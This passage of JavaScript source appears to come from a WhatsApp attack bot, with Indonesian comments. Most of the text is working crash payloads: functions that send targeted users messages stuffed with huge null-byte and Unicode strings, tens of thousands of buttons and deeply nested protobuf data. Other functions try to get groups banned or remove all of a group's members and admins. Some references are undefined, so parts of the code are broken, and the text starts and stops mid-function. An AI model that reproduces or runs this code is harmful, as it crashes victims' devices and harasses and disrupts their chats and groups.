            fileName: "—‌‌‌𝐀𝐫‌𝐠𝐚‌𝐄𝐱𝐜‌𝐚𝐧𝐧‌𝐨‌𝐫", 
            fileLength: "9999999999",
            seconds: 999999,
            mediaKey: "v/J9vWyG92CnR0fqagJ7GBxQzmDG3+cV+DBL1yyECBI=",
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true
            }
          }
        }
      },
      audioMessage: {
        mimetype: "audio/ogg; codecs=opus",
        ptt: true,
        seconds: 9999,
        fileName: "—‌‌‌𝐀𝐫‌𝐠𝐚‌𝐄𝐱𝐜‌𝐚𝐧𝐧‌𝐨‌𝐫" + "꧔꧈".repeat(500),
        fileLength: "9999999999",
        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=", 
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: [
            ...Array.from({ length: 1 }, () =>
              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  };

  await sock.sendMessage(msg.to, msg.message);
}

async function DelayHard(sock, targetJid) {
  try {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    
    for (const x of type) {
      const enty = Math.floor(Math.random() * type.length);
      const msg = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "\u0003",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: x,
                paramsJson: "\x10".repeat(1000000),
                version: 3
              },
              entryPointConversionSource: type[enty]
            }
          }
        }
      };

      await sock.relayMessage(target, msg, {
        participant: { jid: target }
      });

      console.log("Excannor Send Bug:", target);
    }

  } catch (err) {
    console.error("Error:", err);
  }
}

async function delayhardmclaren(sock, targetJid) {
  const Delay = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "$ lx"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 80000 }, () => ({})),
            extra1: "\u0000".repeat(20000),
            extra2: "\u0000".repeat(10000),
            extra3: "\u0000".repeat(20000),
            extra4: "\u0000".repeat(40000),
            extra5: "\u0000".repeat(2000),
            extra6: Array.from({ length: 80000 }, () => ({})),
            extra6: Array.from({ length: 80000 }, () => ({}))
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1999 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
          }
        }
      },
      participant: { Jid: targetJid }
    }
  };

  await sock.relayMessage(targetJid, Delay, {});
}

async function fcmclaren(sock, target) {
  const IMG = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/791885237_1370954038350659_525984428811205570_n.enc?ccb=11-4&oh=01_Q5Aa5gEmTwfJ3abnydAfI8Ep6VahU4nyo_VO9PqUfxxbFFNH8Q&oe=6AC35930&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "mIl61rSmQ4E4z82XpSvhmpSOT8ByiqgLVwrPk4zC4+4=",
    fileLength: "9999999999",
    height: 9999,
    width: 9999,
    mediaKey: "q3wk/KIXEaRS4QD7VG+n5jWvnbdMcO/xjhZ7h4SCBmI=",
    fileEncSha256: "iG6x4KtQSfdcjLNipUagllg3k8Yj3ANspD+9bWstHB0=",
    directPath: "/v/t62.7118-24/791885237_1370954038350659_525984428811205570_n.enc?ccb=11-4&oh=01_Q5Aa5gEmTwfJ3abnydAfI8Ep6VahU4nyo_VO9PqUfxxbFFNH8Q&oe=6AC35930&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1788599798",
    jpegThumbnail: "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",
    contextInfo: {
      featureEligibilities: { canReceiveMultiReact: true },
      pairedMediaType: "NOT_PAIRED_MEDIA",
      statusSourceType: "IMAGE"
    },
    scansSidecar: "fEzYz84hPJzLMNFbyo98xx6yZlX6W4GusDrqhIe0pcsJPQBDrJ6/Tw==",
    scanLengths: [18787, 116942, 40973, 60175],
    midQualityFileSha256: "N8qO2XeOS55EXzkUCxU1G0kj4Araewzz/XX9I2zsiD0="
  };

  const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  const encodeVarint = function(n) {
    var buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = function(tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject({ imageMessage: IMG })
  ).finish();

  const inflate = function(tag, depth) {
    var buf = basePayload;
    for (var i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const resolveJid = function(raw) {
    var s = String(raw || '').trim();
    if (s.includes('@')) return s;
    return s.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const jids = (Array.isArray(target) ? target : [target])
    .map(resolveJid)
    .filter(function(j) { return j.length > 15; });

  if (!jids.length) return;

  for (var i = 0; i < 30; i++) {
    for (var ti = 0; ti < TAGS.length; ti++) {
      var tag = TAGS[ti];
      var payload = null;

      for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
        try {
          var decoded = proto.Message.decode(inflate(tag, depth));
          proto.Message.encode(decoded).finish();
          payload = decoded;
        } catch (_) {}
      }

      if (!payload) continue;

      var msgId = 'CRPT' + Date.now().toString(36).toUpperCase() + '_' + i;

      await sock.relayMessage('status@broadcast', payload, {
        messageId: msgId,
        statusJidList: jids,
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: jids.map(function(jid) {
              return { tag: 'to', attrs: { jid: jid }, content: [] };
            })
          }]
        }]
      });
    }
    await new Promise(r => setTimeout(r, 300));
  }
}

async function delayinvisblemclaren(sock, targetJid) {
    const gen = (str, len) => str.repeat(len);

    await sock.relayMessage(targetJid, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "Cloude Is Here", format: "DEFAULT" },
                    nativeFlowMessage: {
                        buttons: gen("view_ai_message", 30000),
                        messageParamsJson: "{}"
                    },
                    contextInfo: { mentionedJid: [targetJid], isForwarded: true }
                }
            }
        }
    }, { participant: { jid: targetJid }, noSelfSync: true });

    await sock.relayMessage(targetJid, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "Cloude Is Here", format: "DEFAULT" },
                    nativeFlowMessage: {
                        buttons: gen("meta_ai_message", 30000),
                        messageParamsJson: "{}"
                    },
                    contextInfo: { mentionedJid: [targetJid], isForwarded: true }
                }
            }
        }
    }, { participant: { jid: targetJid }, noSelfSync: true });

    await sock.relayMessage(targetJid, {
        interactiveMessage: {
            body: { text: "Cloude Is Here", format: "DEFAULT" },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "order_status",
                        buttonParamsJson: JSON.stringify({ order_id: gen("\u200E", 90000) })
                    }
                ],
                messageParamsJson: "{}"
            },
            contextInfo: {
                quotedMessage: {
                    contactMessage: {
                        displayName: "Cloude Is Here",
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:vnx\nEND:VCARD`
                    }
                },
                mentionedJid: [targetJid],
                isForwarded: true
            }
        }
    }, { participant: { jid: targetJid }, noSelfSync: true });
}

async function blankmclaren(sock, targetJid) {
  if (!targetJid) return;

  const options = {};
  if (targetJid.endsWith('@g.us')) {
    options.participant = { jid: sock.user.id };
  } else {
    options.participants = [{ jid: targetJid }];
  }

  try {
    const invisiblePrefix = "\u200B";
    const blankPayload1 = "\u0000".repeat(100000);
    const fontCrash = "ꦽ".repeat(50000);

    const payloadNova = {
      viewOnceMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: invisiblePrefix + blankPayload1
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: fontCrash,
                    id: "crash_payload_button"
                  })
                }
              ],
              messageParamsJson: JSON.stringify({})
            },
            contextInfo: {
              mentionedJid: [targetJid],
              isForwarded: false,
              forwardingScore: 0
            }
          }
        }
      }
    };

    await sock.relayMessage(targetJid, payloadNova, options);

    const blankPayload2 = "\u0000".repeat(50000);
    const buttonCrashText = "tag_status_crash".repeat(20000);

    const payloadNova2 = {
      viewOnceMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: invisiblePrefix + blankPayload2
            },
            nativeFlowMessage: {
              buttons: buttonCrashText 
            }
          }
        }
      }
    };

    await sock.relayMessage(targetJid, payloadNova2, options);

  } catch (err) {
  }
}

async function BanGroupNew(sock, target) {
  if (!target.endsWith('@g.us')) {
    throw new Error('@g.us server required');
  }

  let group = target;

  try {
    await sock.groupParticipantsUpdate(
      group,
      ['18188880008@s.whatsapp.net'],
      'add',
    );

    await sock.sendPresenceUpdate('composing', group);
  } catch (err) {
    console.error('error:', err);
    throw err;
  }
}

async function bandGroupWork(sock, groupJid) {
  if (!groupJid.endsWith('@g.us')) {
    throw new Error('@g.us server required');
  }

  let group = groupJid;

  try {
    await sock.groupParticipantsUpdate(
      group,
      ['18188880008@s.whatsapp.net'],
      'add',
    );

    await sock.sendPresenceUpdate('composing', group);
  } catch (err) {
    console.error('error:', err);
    throw err;
  }
}

async function iXKudetakick(sock, target) {
    try {
        // Mendapatkan metadata group
        let groupMetadata;
        let groupId;
        
        // Cek apakah target berupa link atau JID
        if (target.includes('chat.whatsapp.com')) {
            // Jika target adalah link group
            const code = target.split('chat.whatsapp.com/')[1];
            const inviteInfo = await sock.groupGetInviteInfo(code);
            groupId = inviteInfo.id;
            groupMetadata = await sock.groupMetadata(groupId);
        } else {
            // Jika target adalah JID group
            groupId = target;
            groupMetadata = await sock.groupMetadata(groupId);
        }

        // Log data group
        console.log('=== DATA GROUP ===');
        console.log(`Nama Group: ${groupMetadata.subject}`);
        console.log(`JID Group: ${groupId}`);
        console.log(`Total Anggota: ${groupMetadata.participants.length}`);
        console.log(`Dibuat oleh: ${groupMetadata.owner || 'Tidak diketahui'}`);
        console.log(`Tanggal dibuat: ${new Date(groupMetadata.creation * 1000).toLocaleString()}`);
        
        // Hitung jumlah admin
        const adminCount = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').length;
        console.log(`Jumlah Admin: ${adminCount}`);
        console.log('===================');

        // Mendapatkan daftar peserta
        const participants = groupMetadata.participants;
        
        // Filter peserta yang akan dikeluarkan
        const participantsToRemove = [];
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        const ownerId = groupMetadata.owner || '';

        let adminRemoved = 0;
        let memberRemoved = 0;

        for (const participant of participants) {
            const participantId = participant.id;
            const isAdmin = participant.admin === 'admin' || participant.admin === 'superadmin';
            
            // Cek apakah peserta adalah bot sendiri
            if (participantId === botId) {
                console.log(`⚠️ Melewati bot sendiri: ${participantId}`);
                continue;
            }

            // Cek apakah peserta adalah pemilik group
            if (participantId === ownerId) {
                console.log(`⚠️ Melewati pemilik group: ${participantId}`);
                continue;
            }

            // Tandai peserta untuk dikeluarkan (termasuk admin)
            participantsToRemove.push({
                id: participantId,
                isAdmin: isAdmin
            });

            if (isAdmin) {
                adminRemoved++;
                console.log(`🔴 Akan mengeluarkan admin: ${participantId}`);
            } else {
                memberRemoved++;
            }
        }

        console.log(`\n📊 Total yang akan dikeluarkan: ${participantsToRemove.length}`);
        console.log(`Admin: ${adminRemoved}`);
        console.log(`Member: ${memberRemoved}`);
        console.log(`📊 Total yang tetap: ${participants.length - participantsToRemove.length - 1}`); // -1 untuk bot sendiri

        // Kirim pesan pengumuman
        const message = "𝖎𝖇𝖓𝖚𝖝𝖎𝖙𝖊𝖗 𝖎𝖘 𝖍𝖊𝖗𝖊";
        const mentions = participantsToRemove.map(p => p.id);
        await sock.sendMessage(groupId, { 
            text: message,
            mentions: mentions
        });
        console.log(`✅ Pesan pengumuman terkirim`);

        // Mengeluarkan anggota satu per satu
        let removedCount = 0;
        let failedCount = 0;
        let adminRemovedSuccess = 0;
        let memberRemovedSuccess = 0;

        for (const participant of participantsToRemove) {
            try {
                await sock.groupParticipantsUpdate(groupId, [participant.id], 'remove');
                removedCount++;
                
                if (participant.isAdmin) {
                    adminRemovedSuccess++;
                    console.log(`✅ Berhasil mengeluarkan admin: ${participant.id} (${removedCount}/${participantsToRemove.length})`);
                } else {
                    memberRemovedSuccess++;
                    console.log(`✅ Berhasil mengeluarkan member: ${participant.id} (${removedCount}/${participantsToRemove.length})`);
                }
                
                // Delay untuk menghindari rate limit
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                failedCount++;
                console.error(`❌ Gagal mengeluarkan: ${participant.id} - ${error.message}`);
            }
        }

        // Log hasil akhir
        console.log('\n=== HASIL PEMBERSIHAN ===');
        console.log(`✅ Total berhasil dikeluarkan: ${removedCount} anggota`);
        console.log(`Admin: ${adminRemovedSuccess}`);
        console.log(`Member: ${memberRemovedSuccess}`);
        console.log(`❌ Total gagal dikeluarkan: ${failedCount} anggota`);
        console.log(`👥 Total anggota tersisa: ${participants.length - removedCount - 1}`); // -1 untuk bot sendiri
        console.log('=========================');

        return {
            success: true,
            groupName: groupMetadata.subject,
            groupId: groupId,
            totalRemoved: removedCount,
            totalFailed: failedCount,
            adminRemoved: adminRemovedSuccess,
            memberRemoved: memberRemovedSuccess,
            totalMembers: participants.length,
            remainingMembers: participants.length - removedCount - 1
        };

    } catch (error) {
        console.error('❌ Error dalam fungsi ibnubot:', error);
        return {
            success: false,
            error: error.message
        };
    }
}

async function BlankGroup(sock, groupJid) {
    await langgxyz.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "\u0003".repeat(200000) },
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            payment_currency: "BTC",
                            payment_amount: 0
                        })
                    }
                }
            }
        }
    }, {});
}

async function CriticalRyu(sock, targetJid) {
  try {
    const send = async (m, o = {}) => sock.relayMessage(target, m, o);
    const rep = (s, n) => s.repeat(n);
    const gen = (s, n) => Array.from({length: n}, (_, i) => `${s + i}@s.whatsapp.net`);
    const rnd = () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`;

    await send({
      interactiveMessage: {
        body: { text: "⌬⃟𝐈‌‌𝐬‌‌𝐭‌‌𝐦‌‌𝐞‌⃟⌬ 𝐒‌‌𝐤‌‌𝐲‌‌⃟⌬", format: "DEFAULT" },
        nativeFlowMessage: { buttons: rep("\uA99E", 500000) },
        contextInfo: { mentionedJid: gen(1, 100) }
      }
    });

    await send({
      interactiveMessage: {
        body: { text: rep("\u0000", 20000) + rep("\u1A01", 50000) + rep("\u1A00", 50000), format: "DEFAULT" },
        nativeFlowMessage: { buttons: rep("chat_gpt_ai", 30000) },
        contextInfo: { mentionedJid: gen(100, 100) }
      }
    });

    await send({
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "⌬⃟𝐈‌‌𝐬‌‌𝐭‌‌𝐦‌‌𝐞‌⃟⌬ 𝐒‌‌𝐤‌‌𝐲‌‌⃟⌬\n", format: "DEFAULT" },
            nativeFlowMessage: {
              messageParamsJson: rep("[", 10000),
              buttons: rep("\u0000", 250000) + rep("\x10", 250000) + rep("\x20", 120000) + rep("\x30", 31000)
            },
            contextInfo: { mentionedJid: gen(200, 100) }
          }
        }
      }
    }, { participant: { jid: target } });

    await send({
      interactiveMessage: {
        body: { text: rep("\u0932", 30000) + rep("\u2134", 30000) + rep("\u0000", 20000), format: "DEFAULT" },
        nativeFlowMessage: { buttons: rep("FM", 20000) },
        contextInfo: { mentionedJid: gen(300, 100) }
      }
    });

    await send({
      interactiveMessage: {
        body: { text: rep("\u200F", 50000) + rep("\u0000", 50000), format: "DEFAULT" },
